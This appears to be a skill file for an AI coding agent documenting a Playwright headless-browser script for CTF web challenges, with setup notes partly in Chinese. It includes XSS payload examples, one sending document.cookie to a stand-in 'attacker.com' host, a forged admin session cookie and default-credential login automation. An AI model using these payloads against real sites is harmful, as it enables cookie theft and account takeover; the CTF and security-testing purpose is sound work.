---
name: browser-automation-playwright
description: Control headless browsers using Playwright for CTF web challenges. Use for XSS validation, DOM analysis, screenshot capture, cookie manipulation, JavaScript execution, and automating complex multi-step web interactions.
---

# Browser Automation with Playwright

Use this skill to control headless browsers via Playwright for CTF web challenges requiring JavaScript execution, DOM manipulation, or multi-step user interactions.

## When to Use

- **XSS Payload Validation**: Verify if XSS payloads execute in real browser context
- **DOM-based Challenges**: Extract data from JavaScript-rendered content
- **Multi-step Forms**: Automate sequences requiring interaction
- **Cookie/Session Testing**: Manipulate cookies, test session behaviors
- **Screenshot Analysis**: Visual confirmation of page states
- **CSP Bypass Testing**: Verify Content Security Policy restrictions
- **Prototype Pollution**: Test JavaScript prototype chain attacks

## Quick Start

```bash
# Take a screenshot of a target
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  screenshot --url "http://target.com/page" --output page.png

# Execute JavaScript and get result
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  evaluate --url "http://target.com" --script "document.cookie"

# Test XSS payload in isolated context
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  xss-test --url "http://target.com/search?q=<script>alert(1)</script>"

# Extract DOM after JavaScript execution
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  extract --url "http://target.com" --selector "#flag"

# Automate form submission
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  form --url "http://target.com/login" \
  --fields '{"username":"admin","password":"admin"}' \
  --submit "button[type=submit]"
```

## Installation

### Requirements

**无需 GUI / 桌面环境** - Playwright 在 headless 模式下可以在纯命令行服务器上运行。

### System Dependencies (Linux)

即使没有显示器，Chromium 也需要以下系统库：

```bash
# Install Playwright and browsers
pip3 install playwright
playwright install chromium  # Only install Chrome
# OR
playwright install  # Install all browsers (Chrome, Firefox, WebKit)
```

如果要安装 Chromium 的系统依赖，推荐：

```bash
which playwright
sudo /home/yhh/.local/bin/playwright install-deps chromium
```

有些环境里 `sudo` 不会继承用户 PATH，这时不要写 `sudo playwright ...`，直接用完整路径。

如果不想依赖 `playwright install-deps`，可以手动安装：

```bash
sudo apt-get update
sudo apt-get install -y \
  libgbm1 \
  libnss3 \
  libatk-bridge2.0-0 \
  libatk1.0-0 \
  libcups2 \
  libdrm2 \
  libxcomposite1 \
  libxdamage1 \
  libxfixes3 \
  libxrandr2 \
  libxkbcommon0 \
  libpango-1.0-0 \
  libcairo2 \
  libatspi2.0-0 \
  libgtk-3-0
```

### Verify Installation

```bash
python3 -c "from playwright.sync_api import sync_playwright; print('Playwright OK')"
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py check
```

## CTF Workflow Patterns

### Pattern 1: XSS Payload Validation

```bash
# Test if XSS executes and capture alert
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  xss-test \
  --url "http://target.com/?input=<img src=x onerror=alert(document.cookie)>" \
  --capture-console \
  --wait-for-alert 5
```

### Pattern 2: DOM Content Extraction

```bash
# Get page content after JavaScript renders
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  extract \
  --url "http://target.com/challenge" \
  --wait-for-selector "#flag" \
  --timeout 10000
```

### Pattern 3: Cookie/Session Manipulation

```bash
# Set custom cookies and navigate
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  navigate \
  --url "http://target.com/admin" \
  --cookies '{"session":"eyJhZG1pbiI6dHJ1ZX0=","token":"abc123"}'
```

### Pattern 4: Multi-step Automation

```bash
# Chain actions: login → navigate → extract
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  chain \
  --steps '[
    {"action":"goto","url":"http://target.com/login"},
    {"action":"fill","selector":"#user","value":"admin"},
    {"action":"fill","selector":"#pass","value":"password"},
    {"action":"click","selector":"#submit"},
    {"action":"wait","ms":2000},
    {"action":"goto","url":"http://target.com/flag"},
    {"action":"extract","selector":"#flag"}
  ]'
```

### Pattern 5: CSP Bypass Testing

```bash
# Test iframe, inline script restrictions
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  csp-test \
  --url "http://target.com" \
  --payloads 'csp_bypasses.json'
```

## Command Reference

### Commands

| Command | Description |
|---------|-------------|
| `screenshot` | Capture page screenshot |
| `evaluate` | Execute JavaScript and return result |
| `extract` | Extract DOM content by selector |
| `navigate` | Navigate to URL with options |
| `form` | Fill and submit forms |
| `xss-test` | Test XSS payloads with alert/dialog capture |
| `chain` | Execute multiple actions in sequence |
| `csp-test` | Test Content Security Policy restrictions |
| `request` | Intercept and modify requests |
| `storage` | View/modify localStorage/sessionStorage |

### Common Options

| Option | Description |
|--------|-------------|
| `--url` | Target URL |
| `--output` | Output file path |
| `--selector` | CSS selector for element targeting |
| `--timeout` | Timeout in milliseconds (default: 30000) |
| `--headless` | Run in headless mode (default: true) |
| `--cookies` | JSON string of cookies to set |
| `--headers` | Custom HTTP headers |
| `--proxy` | Proxy URL (e.g., http://127.0.0.1:8080) |
| `--user-agent` | Custom user agent string |
| `--viewport` | Viewport size (e.g., 1920x1080) |
| `--wait-for` | Wait for selector/text/timeout |
| `--capture-console` | Capture browser console logs |
| `--capture-network` | Capture network requests |

## Security Considerations

### XSS Testing Safety

- Always use `--headless=true` for automated testing
- Payloads execute in isolated browser context
- Alert dialogs are automatically handled
- Console output is captured for debugging

### Request Interception

```bash
# Intercept and modify requests
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  request \
  --url "http://target.com" \
  --intercept "**/api/**" \
  --modify '{"headers":{"X-Custom":"value"}}'
```

### Sandbox Escape Prevention

When testing untrusted payloads:
- Use separate browser context per test
- Clear cookies/storage between tests
- Run in restricted network environment
- Monitor resource usage

## Integration with CTF Workflow

### During Recon

```bash
# Screenshot all discovered endpoints
for url in $(cat urls.txt); do
  python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
    screenshot --url "$url" --output "screens/$(basename $url).png"
done
```

### During Exploitation

```bash
# Test reflected XSS
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  xss-test \
  --url "http://target.com/echo?input=<script>fetch('http://attacker.com/?c='+document.cookie)</script>" \
  --capture-network

# Test stored XSS (with bot simulation)
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  chain \
  --steps '[
    {"action":"goto","url":"http://target.com/post"},
    {"action":"fill","selector":"#content","value":"<script>alert(1)</script>"},
    {"action":"click","selector":"#submit"},
    {"action":"wait","ms":1000},
    {"action":"goto","url":"http://target.com/view"},
    {"action":"wait","ms":3000}
  ]' \
  --capture-console
```

### For DOM-based Challenges

```bash
# Extract flag from JavaScript-rendered content
python3 .claude/skills/browser-automation-playwright/scripts/browser_ctl.py \
  extract \
  --url "http://target.com/challenge" \
  --script "
    // Wait for custom decryption
    await new Promise(r => setTimeout(r, 2000));
    return document.querySelector('#flag').innerText;
  "
```

## Troubleshooting

### Headless Mode (No GUI Required)

Playwright 默认在 **headless 模式**下运行，**不需要显示器、X11 或桌面环境**。

```bash
# 在纯 SSH 服务器上可以正常运行
python3 browser_ctl.py screenshot --url "http://target.com" --output /tmp/out.png
```

### Server Deployment

在 Linux 服务器（包括云服务器、Docker、WSL）上，需要安装系统库：

```bash
# Ubuntu/Debian
sudo apt-get install libgbm1 libnss3 libatk-bridge2.0-0 libxkbcommon0 libgtk-3-0

# Or use Playwright's installer
playwright install-deps chromium
```

### Docker 运行

```bash
# 使用官方 Playwright 镜像（已包含所有依赖）
docker run -it --rm --ipc=host mcr.microsoft.com/playwright:v1.40.0-jammy \
  python3 -m playwright screenshot https://example.com /tmp/example.png
```

### Browser Launch Fails

```bash
# Install missing system dependencies
playwright install-deps chromium

# Check for conflicting Chrome instances
pkill -f chromium

# Use specific executable path
export PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH=/usr/bin/chromium
```

### Timeout Issues

```bash
# Increase timeout for slow-loading pages
--timeout 60000

# Wait for specific element instead
--wait-for-selector "#content"
```

### SSL Certificate Errors

```bash
# Ignore HTTPS errors (CTF labs often use self-signed certs)
--ignore-https-errors
```

## Maintenance

Keep Playwright updated:
```bash
pip3 install --upgrade playwright
playwright install chromium
```

For CTF challenges requiring specific browser versions, use Docker:
```bash
docker run -it --rm --ipc=host mcr.microsoft.com/playwright:v1.40.0-jammy
```

## References

- [Playwright Documentation](https://playwright.dev/python/)
- [CTF XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [DOM Clobbering Techniques](https://domclob.xyz/)
